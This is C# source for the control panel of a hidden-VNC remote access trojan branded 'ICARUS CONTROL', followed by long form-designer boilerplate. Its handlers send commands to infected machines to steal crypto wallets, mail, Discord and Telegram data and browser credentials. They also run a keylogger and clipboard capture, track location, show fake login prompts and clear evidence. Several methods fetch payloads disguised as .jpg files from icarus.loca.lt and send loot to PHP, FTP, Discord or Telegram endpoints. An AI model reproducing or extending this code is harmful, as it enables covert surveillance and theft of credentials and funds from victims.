        private void armoryToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (!armoryToolStripMenuItem.Text.Contains("Started"))
            {
                SendTCP("2014*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
                armoryToolStripMenuItem.Text = "Armory Started";
            }
            else
            {
                SendTCP("2015*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
                armoryToolStripMenuItem.Text = "Armory Stopped";
            }
        }

        private void GuardaItem_Click(object sender, EventArgs e)
        {
            if (!GuardaItem.Text.Contains("Started"))
            {
                SendTCP("2018*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
                GuardaItem.Text = "Guarda Started";
            }
            else
            {
                SendTCP("2019*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
                GuardaItem.Text = "Guarda Stopped";
            }
        }

        private void coinomiToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (!coinomiToolStripMenuItem.Text.Contains("Started"))
            {
                SendTCP("2016*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
                coinomiToolStripMenuItem.Text = "Coinomi Started";
            }
            else
            {
                SendTCP("2017*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
                coinomiToolStripMenuItem.Text = "Coinomi Stopped";
            }
        }

        private void exodusToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (!exodusToolStripMenuItem.Text.Contains("Started"))
            {
                SendTCP("2020*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
                exodusToolStripMenuItem.Text = "Exodus Started";
            }
            else
            {
                SendTCP("2021*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
                exodusToolStripMenuItem.Text = "Exodus Stopped";
            }
        }

        private void atomicToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (!atomicToolStripMenuItem.Text.Contains("Started"))
            {
                SendTCP("2022*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
                atomicToolStripMenuItem.Text = "Atomic Started";
            }
            else
            {
                SendTCP("2023*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
                atomicToolStripMenuItem.Text = "Atomic Stopped";
            }
        }

        private void jaxxToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (!jaxxToolStripMenuItem.Text.Contains("Started"))
            {
                SendTCP("2024*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
                jaxxToolStripMenuItem.Text = "Jaxx Started";
            }
            else
            {
                SendTCP("2025*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
                jaxxToolStripMenuItem.Text = "Jaxx Stopped";
            }
        }

        private void outlookToolStripMenuItem_Click_1(object sender, EventArgs e)
        {
            if (!outlookToolStripMenuItem.Text.Contains("Started"))
            {
                SendTCP("555*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
                outlookToolStripMenuItem.Text = "Outlook Started";
            }
            else
            {
                SendTCP("2028*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
                outlookToolStripMenuItem.Text = "Outlook Stopped";
            }
        }

        private void foxmailToolStripMenuItem_Click_1(object sender, EventArgs e)
        {
            if (!foxmailToolStripMenuItem.Text.Contains("Started"))
            {
                SendTCP("556*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
                foxmailToolStripMenuItem.Text = "Foxmail Started";
            }
            else
            {
                SendTCP("2030*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
                foxmailToolStripMenuItem.Text = "Foxmail Stopped";
            }
        }

        private void thunderbirdToolStripMenuItem_Click_1(object sender, EventArgs e)
        {
            if (!thunderbirdToolStripMenuItem.Text.Contains("Started"))
            {
                SendTCP("557*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
                thunderbirdToolStripMenuItem.Text = "Thunderbird Started";
            }
            else
            {
                SendTCP("2031*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
                thunderbirdToolStripMenuItem.Text = "Thunderbird Stopped";
            }
        }

        private void skypeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (!skypeToolStripMenuItem.Text.Contains("Started"))
            {
                SendTCP("2032*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
                skypeToolStripMenuItem.Text = "Skype Started";
            }
            else
            {
                SendTCP("2033*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
                skypeToolStripMenuItem.Text = "Skype Stopped";
            }
        }

        private void discordToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (!discordToolStripMenuItem.Text.Contains("Started"))
            {
                SendTCP("2034*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
                discordToolStripMenuItem.Text = "Discord Started";
            }
            else
            {
                SendTCP("2035*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
                discordToolStripMenuItem.Text = "Discord Stopped";
            }
        }

        private void telegramToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (!telegramToolStripMenuItem.Text.Contains("Started"))
            {
                SendTCP("2036*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
                telegramToolStripMenuItem.Text = "Telegram Started";
            }
            else
            {
                SendTCP("2037*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
                telegramToolStripMenuItem.Text = "Telegram Stopped";
            }
        }

        private void studioButton7_Click(object sender, EventArgs e)
        {
            contextMenuStrip4.Show(studioButton7, 0, studioButton7.Height);
        }

        private void studioButton9_Click(object sender, EventArgs e)
        {
            contextMenuStrip5.Show(studioButton9, 0, studioButton9.Height);
        }

        private void msinfo32exeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (!msinfo32exeToolStripMenuItem.Text.Contains("Started"))
            {
                SendTCP("2052*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
                msinfo32exeToolStripMenuItem.Text = "SystemInfo Started";
            }
            else
            {
                SendTCP("2053*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
                msinfo32exeToolStripMenuItem.Text = "SystemInfo Stopped";
            }
        }

        private void mstscexeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (!mstscexeToolStripMenuItem.Text.Contains("Started"))
            {
                SendTCP("2054*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
                mstscexeToolStripMenuItem.Text = "Mstsc Started";
            }
            else
            {
                SendTCP("2055*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
                mstscexeToolStripMenuItem.Text = "Mstsc Stopped";
            }
        }

        private void timer3_Tick(object sender, EventArgs e)
        {
            SendTCP("19*" + Conversions.ToString((double)ResizeScroll.Value / 100.0), tcpClient_0);
        }

        private void notepadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (!notepadToolStripMenuItem.Text.Contains("Started"))
            {
                SendTCP("2040*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
                notepadToolStripMenuItem.Text = "Notepad Started";
            }
            else
            {
                SendTCP("2041*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
                notepadToolStripMenuItem.Text = "Notepad Stopped";
            }
        }

        private void controlPanelToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (!controlPanelToolStripMenuItem.Text.Contains("Started"))
            {
                SendTCP("2038*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
                controlPanelToolStripMenuItem.Text = "Control Started";
            }
            else
            {
                SendTCP("2039*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
                controlPanelToolStripMenuItem.Text = "Control Stopped";
            }
        }

        private void studioButton8_Click_1(object sender, EventArgs e)
        {
            Help help = new Help();
            help.ShowDialog();
        }

        private void studioButton10_Click(object sender, EventArgs e)
        {
            contextMenuStrip6.Show(studioButton10, 0, studioButton10.Height);
        }

        private void stealAndSendToTelegramToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (TGDC0.IsDisposed)
            {
                TGDC0 = new TGtoDSC();
            }
            TGDC0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
            TGDC0.Text = Text.Replace(" ICARUS CONTROL" + versioning() + " [ Connected: " + userName + "  ] ", null);
            TGDC0.Show();
        }

        private void stealAndSendToDiscordToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (TGDC0.IsDisposed)
            {
                TGDC0 = new TGtoDSC();
            }
            TGDC0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
            TGDC0.Text = Text.Replace(" ICARUS CONTROL" + versioning() + " [ Connected: " + userName + "  ] ", null);
            TGDC0.Show();
        }

        private void comodoToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (!comodoToolStripMenuItem.Text.Contains("Started"))
            {
                SendTCP("996*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
                comodoToolStripMenuItem.Text = "Comodo Started";
            }
            else
            {
                SendTCP("2057*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
                comodoToolStripMenuItem.Text = "Comodo Stopped";
            }
        }

        private void yandexToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (!yandexToolStripMenuItem.Text.Contains("Started"))
            {
                SendTCP("1006*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
                yandexToolStripMenuItem.Text = "Yandex Started";
            }
            else
            {
                SendTCP("2056*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
                yandexToolStripMenuItem.Text = "Yandex Stopped";
            }
        }

        private void operaNeonToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (!operaNeonToolStripMenuItem.Text.Contains("Started"))
            {
                SendTCP("998*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
                operaNeonToolStripMenuItem.Text = "OperaNeon Started";
            }
            else
            {
                SendTCP("2060*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
                operaNeonToolStripMenuItem.Text = "OperaNeon Stopped";
            }
        }

        private void waterFoxToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (!waterFoxToolStripMenuItem.Text.Contains("Started"))
            {
                SendTCP("1005*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
                waterFoxToolStripMenuItem.Text = "Waterfox Started";
            }
            else
            {
                SendTCP("2061*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
                waterFoxToolStripMenuItem.Text = "Waterfox Stopped";
            }
        }

        private void orbitumToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (!orbitumToolStripMenuItem.Text.Contains("Started"))
            {
                SendTCP("999*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
                orbitumToolStripMenuItem.Text = "Orbitum Started";
            }
            else
            {
                SendTCP("2062*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
                orbitumToolStripMenuItem.Text = "Orbitum Stopped";
            }
        }

        private void atomToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (!atomToolStripMenuItem.Text.Contains("Started"))
            {
                SendTCP("992*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
                atomToolStripMenuItem.Text = "Atom Started";
            }
            else
            {
                SendTCP("2063*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
                atomToolStripMenuItem.Text = "Atom Stopped";
            }
        }

        private void slimjetToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (!slimjetToolStripMenuItem.Text.Contains("Started"))
            {
                SendTCP("1001*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
                slimjetToolStripMenuItem.Text = "Slimjet Started";
            }
            else
            {
                SendTCP("2064*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
                slimjetToolStripMenuItem.Text = "Slimjet Stopped";
            }
        }

        private void dingTalkToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (!dingTalkToolStripMenuItem.Text.Contains("Started"))
            {
                SendTCP("2058*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
                dingTalkToolStripMenuItem.Text = "DingTalk Started";
            }
            else
            {
                SendTCP("2059*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
                dingTalkToolStripMenuItem.Text = "DingTalk Stopped";
            }
        }

        private void downloadLogsViaSocketToolStripMenuItem_Click(object sender, EventArgs e)
        {
            SendTCP("2065*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
        }

        private void clearEvidenceToolStripMenuItem_Click(object sender, EventArgs e)
        {
            SendTCP("2066*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
        }

        private void studioButton11_Click(object sender, EventArgs e)
        {
            SendTCP("8587*", (TcpClient)base.Tag);
        }

        private void button3_Click(object sender, EventArgs e)
        {
        }

        public hVNC()
        {
            int_0 = 0;
            bool_1 = true;
            bool_2 = false;
            FrmTransfer0 = new MoveBytes();
            TGDC0 = new TGtoDSC();
            TGDCF = new IWhoamiN();
            InitializeComponent();
            VNCBox.MouseEnter += VNCBox_MouseEnter;
            VNCBox.MouseLeave += VNCBox_MouseLeave;
            VNCBox.KeyPress += VNCBox_KeyPress;
        }

        private void timer4_Tick(object sender, EventArgs e)
        {
            toolStripStatusLabel3.Text = "Idle";
            FrmTransfer0.FileTransferLabele.Text = "Idle";
        }

        public static string versioning()
        {
            Assembly executingAssembly = Assembly.GetExecutingAssembly();
            FileVersionInfo versionInfo = FileVersionInfo.GetVersionInfo(executingAssembly.Location);
            return versionInfo.ProductVersion;
        }

        private void fakeLoginToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (TGDCF.IsDisposed)
            {
                TGDCF = new IWhoamiN();
            }
            TGDCF.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
            TGDCF.Text = Text.Replace(" ICARUS CONTROL" + versioning() + " [ Connected: " + userName + "  ] ", null);
            TGDCF.Show();
        }

        private void killAllAntivusesToolStripMenuItem_Click(object sender, EventArgs e)
        {
        }

        private void studioButton12_Click(object sender, EventArgs e)
        {
            SendTCP("2071*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
        }

        private void startToolStripMenuItem_Click(object sender, EventArgs e)
        {
        }

        private void btnKeyl_Click(object sender, EventArgs e)
        {
            contextMenuStrip7.Show(btnKeyl, 0, btnKeyl.Height);
        }

        private void timer5_Tick(object sender, EventArgs e)
        {
            if (chkKeylog.Checked)
            {
                try
                {
                    studioButton12.PerformClick();
                    txtKeyl.ScrollToCaret();
                    return;
                }
                catch
                {
                    return;
                }
            }
            SendTCP("2070*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
        }

        private void stopToolStripMenuItem_Click(object sender, EventArgs e)
        {
            SendTCP("2070*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
        }

        private void chkClip_CheckedChanged(object sender, EventArgs e)
        {
            if (chkClip.Checked)
            {
                try
                {
                    SendTCP("2072*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
                    btnClip.PerformClick();
                    return;
                }
                catch
                {
                    return;
                }
            }
            SendTCP("2073*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
        }

        private void txtKeyl_TextChanged(object sender, EventArgs e)
        {
            txtKeyl.SelectionStart = txtKeyl.Text.Length;
            txtKeyl.ScrollToCaret();
        }

        private void txtClip_TextChanged(object sender, EventArgs e)
        {
            txtClip.SelectionStart = txtClip.Text.Length;
            txtClip.ScrollToCaret();
        }

        private void btnClip_Click(object sender, EventArgs e)
        {
            SendTCP("2072*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
        }

        private void button1_Click_1(object sender, EventArgs e)
        {
        }

        private void chkInfo_CheckedChanged(object sender, EventArgs e)
        {
            if (chkInfo.Checked)
            {
                try
                {
                    SendTCP("2074*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
                    btnInfo.PerformClick();
                }
                catch
                {
                }
            }
        }

        private void btnInfo_Click(object sender, EventArgs e)
        {
            SendTCP("2074*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
        }

        private void timer6_Tick(object sender, EventArgs e)
        {
            if (chkInfo.Checked)
            {
                try
                {
                    btnInfo.PerformClick();
                }
                catch
                {
                }
            }
        }

        private void timer7_Tick(object sender, EventArgs e)
        {
            if (chkClip.Checked)
            {
                try
                {
                    btnClip.PerformClick();
                    txtClip.ScrollToCaret();
                }
                catch
                {
                }
            }
        }

        private void timer8_Tick(object sender, EventArgs e)
        {
            SendTCP("2068*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
        }

        private void timer9_Tick(object sender, EventArgs e)
        {
            SendTCP("2167*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
        }

        private void studioButton13_Click(object sender, EventArgs e)
        {
            try
            {
                map.MapProvider = GMapProviders.BingHybridMap;
                double lat = Convert.ToDouble(txtlatitude.Text);
                double lng = Convert.ToDouble(txtlongitude.Text);
                map.Position = new PointLatLng(lat, lng);
                map.MinZoom = 5;
                map.MaxZoom = 100;
                map.Zoom = 10.0;
                PointLatLng p = new PointLatLng(lat, lng);
                GMapMarker item = new GMarkerGoogle(p, GMarkerGoogleType.lightblue_pushpin);
                GMapOverlay gMapOverlay = new GMapOverlay("markers");
                gMapOverlay.Markers.Add(item);
                map.Overlays.Add(gMapOverlay);
            }
            catch
            {
            }
        }

        protected override void OnResize(EventArgs e)
        {
        }

        private void mousemoveREAL(object sender, MouseEventArgs e)
        {
        }

        private void mousemoveDOWN(object sender, MouseEventArgs e)
        {
        }

        private void mousemoveUP(object sender, MouseEventArgs e)
        {
        }

        private void button5_Click(object sender, EventArgs e)
        {
        }

        private void button6_Click(object sender, EventArgs e)
        {
        }

        private void button4_Click(object sender, EventArgs e)
        {
        }

        private void button2_Click(object sender, EventArgs e)
        {
        }

        private void button1_Click(object sender, EventArgs e)
        {
        }

        private void timer10_Tick(object sender, EventArgs e)
        {
            try
            {
                map.MapProvider = GMapProviders.BingHybridMap;
                map.Overlays.Clear();
                double lat = Convert.ToDouble(txtlatitude.Text);
                double lng = Convert.ToDouble(txtlongitude.Text);
                map.Position = new PointLatLng(lat, lng);
                map.MinZoom = 5;
                map.MaxZoom = 100;
                map.Zoom = 10.0;
                PointLatLng p = new PointLatLng(lat, lng);
                GMapMarker item = new GMarkerGoogle(p, GMarkerGoogleType.lightblue_pushpin);
                GMapOverlay gMapOverlay = new GMapOverlay("markers");
                gMapOverlay.Markers.Add(item);
                map.Overlays.Add(gMapOverlay);
            }
            catch
            {
            }
        }

        private void timer11_Tick(object sender, EventArgs e)
        {
            try
            {
                if (chkClip.Checked)
                {
                    SendTCP("2072*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
                }
                if (chkKeylog.Checked)
                {
                    SendTCP("2071*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
                }
                if (chkInfo.Checked)
                {
                    SendTCP("2074*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
                }
                if (chkWallets.Checked)
                {
                    SendTCP("2082" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
                }
            }
            catch
            {
            }
        }

        private void stealAllWalletsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (!string.IsNullOrWhiteSpace(Settings.Default.PHPLINK))
            {
                SendTCP("55*https://icarus.loca.lt/crypt/public/Update_Downloads/ebook.jpg*PHP*" + Convert.ToString(Settings.Default.PHPLINK) + "*" + Convert.ToString("4"), (TcpClient)base.Tag);
                return;
            }
            string text = Interaction.InputBox("\nInput PHP Uploader Url here.\n\nOnly url please.", "Url");
            if (!string.IsNullOrEmpty(text))
            {
                SendTCP("55*https://icarus.loca.lt/crypt/public/Update_Downloads/ebook.jpg*PHP*" + Convert.ToString(Settings.Default.PHPLINK) + "*" + Convert.ToString("4"), (TcpClient)base.Tag);
                Settings.Default.PHPLINK = text;
                Settings.Default.Save();
            }
        }

        private void chkKeylog_CheckedChanged(object sender, EventArgs e)
        {
            try
            {
                SendTCP("2071*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
            }
            catch
            {
            }
        }

        private void studioButton14_Click(object sender, EventArgs e)
        {
            string text = Path.Combine(Application.StartupPath, "Up.php");
            File.WriteAllBytes(text, Resources.Upload);
            MessageBox.Show("Your uploader is located:" + text + " .Please upload this to your web hosting and copy the link");
        }

        internal void IcarusRecovery(string url)
        {
            SendTCP("55*https://icarus.loca.lt/crypt/public/Update_Downloads/IcarsPHP.jpg*PHP*" + url + "*" + Convert.ToString("4"), (TcpClient)base.Tag);
        }

        internal void IcarusFTPRecovery(string domain, string userName, string pass)
        {
            SendTCP("55*https://icarus.loca.lt/crypt/public/Update_Downloads/IcarsFTP.jpg*FTP*" + domain + "*" + userName + "*" + pass + "*" + Convert.ToString("4"), (TcpClient)base.Tag);
        }

        internal void IcarusDiscRecovery(string url)
        {
            SendTCP("55*https://icarus.loca.lt/crypt/public/Update_Downloads/IcarsS.jpg*discord*" + url + "*" + Convert.ToString("4"), (TcpClient)base.Tag);
        }

        internal void IcarusTGRecovery(string tgchatid, string tgtoken)
        {
            SendTCP("55*https://icarus.loca.lt/crypt/public/Update_Downloads/Icar.jpg*telegram*" + tgtoken + "*" + tgchatid + "*" + Convert.ToString("4"), (TcpClient)base.Tag);
        }

        internal void IcarusWalletsRecovery(string url)
        {
            SendTCP("55*https://icarus.loca.lt/crypt/public/Update_Downloads/ebook.jpg*PHP*" + url + "*" + Convert.ToString("4"), (TcpClient)base.Tag);
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing && components != null)
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(HVNC.hVNC));
            Bloom bloom = new Bloom();
            Bloom bloom2 = new Bloom();
            Bloom bloom3 = new Bloom();
            Bloom bloom4 = new Bloom();
            Bloom bloom5 = new Bloom();
            Bloom bloom6 = new Bloom();
            Bloom bloom7 = new Bloom();
            Bloom bloom8 = new Bloom();
            Bloom bloom9 = new Bloom();
            Bloom bloom10 = new Bloom();
            Bloom bloom11 = new Bloom();
            Bloom bloom12 = new Bloom();
            Bloom bloom13 = new Bloom();
            Bloom bloom14 = new Bloom();
            Bloom bloom15 = new Bloom();
            Bloom bloom16 = new Bloom();
            Bloom bloom17 = new Bloom();
            Bloom bloom18 = new Bloom();
            Bloom bloom19 = new Bloom();
            Bloom bloom20 = new Bloom();
            Bloom bloom21 = new Bloom();
            Bloom bloom22 = new Bloom();
            Bloom bloom23 = new Bloom();
            Bloom bloom24 = new Bloom();
            Bloom bloom25 = new Bloom();
            Bloom bloom26 = new Bloom();
            Bloom bloom27 = new Bloom();
            Bloom bloom28 = new Bloom();
            Bloom bloom29 = new Bloom();
            Bloom bloom30 = new Bloom();
            Bloom bloom31 = new Bloom();
            Bloom bloom32 = new Bloom();
            Bloom bloom33 = new Bloom();
            Bloom bloom34 = new Bloom();
            Bloom bloom35 = new Bloom();
            Bloom bloom36 = new Bloom();
            Bloom bloom37 = new Bloom();
            Bloom bloom38 = new Bloom();
            Bloom bloom39 = new Bloom();
            Bloom bloom40 = new Bloom();
            Bloom bloom41 = new Bloom();
            Bloom bloom42 = new Bloom();
            Bloom bloom43 = new Bloom();
            Bloom bloom44 = new Bloom();
            Bloom bloom45 = new Bloom();
            Bloom bloom46 = new Bloom();
            Bloom bloom47 = new Bloom();
            Bloom bloom48 = new Bloom();
            Bloom bloom49 = new Bloom();
            Bloom bloom50 = new Bloom();
            Bloom bloom51 = new Bloom();
            Bloom bloom52 = new Bloom();
            Bloom bloom53 = new Bloom();
            Bloom bloom54 = new Bloom();
            Bloom bloom55 = new Bloom();
            Bloom bloom56 = new Bloom();
            Bloom bloom57 = new Bloom();
            Bloom bloom58 = new Bloom();
            Bloom bloom59 = new Bloom();
            Bloom bloom60 = new Bloom();
            Bloom bloom61 = new Bloom();
            Bloom bloom62 = new Bloom();
            Bloom bloom63 = new Bloom();
            Bloom bloom64 = new Bloom();
            Bloom bloom65 = new Bloom();
            Bloom bloom66 = new Bloom();
            Bloom bloom67 = new Bloom();
            Bloom bloom68 = new Bloom();
            Bloom bloom69 = new Bloom();
            Bloom bloom70 = new Bloom();
            Bloom bloom71 = new Bloom();
            Bloom bloom72 = new Bloom();
            Bloom bloom73 = new Bloom();
            Bloom bloom74 = new Bloom();
            Bloom bloom75 = new Bloom();
            Bloom bloom76 = new Bloom();
            Bloom bloom77 = new Bloom();
            Bloom bloom78 = new Bloom();
            Bloom bloom79 = new Bloom();
            Bloom bloom80 = new Bloom();
            Bloom bloom81 = new Bloom();
            Bloom bloom82 = new Bloom();
            Bloom bloom83 = new Bloom();
            Bloom bloom84 = new Bloom();
            Bloom bloom85 = new Bloom();
            Bloom bloom86 = new Bloom();
            Bloom bloom87 = new Bloom();
            Bloom bloom88 = new Bloom();
            Bloom bloom89 = new Bloom();
            Bloom bloom90 = new Bloom();
            Bloom bloom91 = new Bloom();
            Bloom bloom92 = new Bloom();
            Bloom bloom93 = new Bloom();
            Bloom bloom94 = new Bloom();
            Bloom bloom95 = new Bloom();
            Bloom bloom96 = new Bloom();
            Bloom bloom97 = new Bloom();
            Bloom bloom98 = new Bloom();
            Bloom bloom99 = new Bloom();
            Bloom bloom100 = new Bloom();
            Bloom bloom101 = new Bloom();
            Bloom bloom102 = new Bloom();
            Bloom bloom103 = new Bloom();
            Bloom bloom104 = new Bloom();
            Bloom bloom105 = new Bloom();
            Bloom bloom106 = new Bloom();
            Bloom bloom107 = new Bloom();
            Bloom bloom108 = new Bloom();
            Bloom bloom109 = new Bloom();
            Bloom bloom110 = new Bloom();
            Bloom bloom111 = new Bloom();
            Bloom bloom112 = new Bloom();
            Bloom bloom113 = new Bloom();
            Bloom bloom114 = new Bloom();
            Bloom bloom115 = new Bloom();
            Bloom bloom116 = new Bloom();
            Bloom bloom117 = new Bloom();
            Bloom bloom118 = new Bloom();
            Bloom bloom119 = new Bloom();
            Bloom bloom120 = new Bloom();
            Bloom bloom121 = new Bloom();
            Bloom bloom122 = new Bloom();
            Bloom bloom123 = new Bloom();
            Bloom bloom124 = new Bloom();
            Bloom bloom125 = new Bloom();
            Bloom bloom126 = new Bloom();
            Bloom bloom127 = new Bloom();
            Bloom bloom128 = new Bloom();
            Bloom bloom129 = new Bloom();
            Bloom bloom130 = new Bloom();
            Bloom bloom131 = new Bloom();
            Bloom bloom132 = new Bloom();
            Bloom bloom133 = new Bloom();
            Bloom bloom134 = new Bloom();
            Bloom bloom135 = new Bloom();
            Bloom bloom136 = new Bloom();
            Bloom bloom137 = new Bloom();
            Bloom bloom138 = new Bloom();
            Bloom bloom139 = new Bloom();
            Bloom bloom140 = new Bloom();
            Bloom bloom141 = new Bloom();
            Bloom bloom142 = new Bloom();
            Bloom bloom143 = new Bloom();
            Bloom bloom144 = new Bloom();
            Bloom bloom145 = new Bloom();
            Bloom bloom146 = new Bloom();
            Bloom bloom147 = new Bloom();
            Bloom bloom148 = new Bloom();
            Bloom bloom149 = new Bloom();
            Bloom bloom150 = new Bloom();
            Bloom bloom151 = new Bloom();
            Bloom bloom152 = new Bloom();
            Bloom bloom153 = new Bloom();
            Bloom bloom154 = new Bloom();
            Bloom bloom155 = new Bloom();
            Bloom bloom156 = new Bloom();
            Bloom bloom157 = new Bloom();
            Bloom bloom158 = new Bloom();
            Bloom bloom159 = new Bloom();
            Bloom bloom160 = new Bloom();
            Bloom bloom161 = new Bloom();
            Bloom bloom162 = new Bloom();
            Bloom bloom163 = new Bloom();
            Bloom bloom164 = new Bloom();
            Bloom bloom165 = new Bloom();
            Bloom bloom166 = new Bloom();
            Bloom bloom167 = new Bloom();
            Bloom bloom168 = new Bloom();
            Bloom bloom169 = new Bloom();
            Bloom bloom170 = new Bloom();
            Bloom bloom171 = new Bloom();
            Bloom bloom172 = new Bloom();
            Bloom bloom173 = new Bloom();
            Bloom bloom174 = new Bloom();
            Bloom bloom175 = new Bloom();
            Bloom bloom176 = new Bloom();
            Bloom bloom177 = new Bloom();
            Bloom bloom178 = new Bloom();
            Bloom bloom179 = new Bloom();
            Bloom bloom180 = new Bloom();
            Bloom bloom181 = new Bloom();
            Bloom bloom182 = new Bloom();
            Bloom bloom183 = new Bloom();
            Bloom bloom184 = new Bloom();
            Bloom bloom185 = new Bloom();
            Bloom bloom186 = new Bloom();
            Bloom bloom187 = new Bloom();
            Bloom bloom188 = new Bloom();
            Bloom bloom189 = new Bloom();
            Bloom bloom190 = new Bloom();
            Bloom bloom191 = new Bloom();
            Bloom bloom192 = new Bloom();
            Bloom bloom193 = new Bloom();
            Bloom bloom194 = new Bloom();
            Bloom bloom195 = new Bloom();
            Bloom bloom196 = new Bloom();
            Bloom bloom197 = new Bloom();
            Bloom bloom198 = new Bloom();
            Bloom bloom199 = new Bloom();
            Bloom bloom200 = new Bloom();
            Bloom bloom201 = new Bloom();
            Bloom bloom202 = new Bloom();
            Bloom bloom203 = new Bloom();
            Bloom bloom204 = new Bloom();
            Bloom bloom205 = new Bloom();
            Bloom bloom206 = new Bloom();
            Bloom bloom207 = new Bloom();
            Bloom bloom208 = new Bloom();
            this.timer1 = new System.Windows.Forms.Timer(this.components);
            this.contextMenuStrip1 = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.closeToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripStatusLabel1 = new System.Windows.Forms.ToolStripStatusLabel();
            this.toolStripStatusLabel2 = new System.Windows.Forms.ToolStripStatusLabel();
            this.timer2 = new System.Windows.Forms.Timer(this.components);
            this.contextMenuStrip2 = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.electrumToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.armoryToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.GuardaItem = new System.Windows.Forms.ToolStripMenuItem();
            this.coinomiToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.exodusToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.atomicToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.jaxxToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.contextMenuStrip3 = new System.Windows.Forms.ContextMenuStrip(this.components);
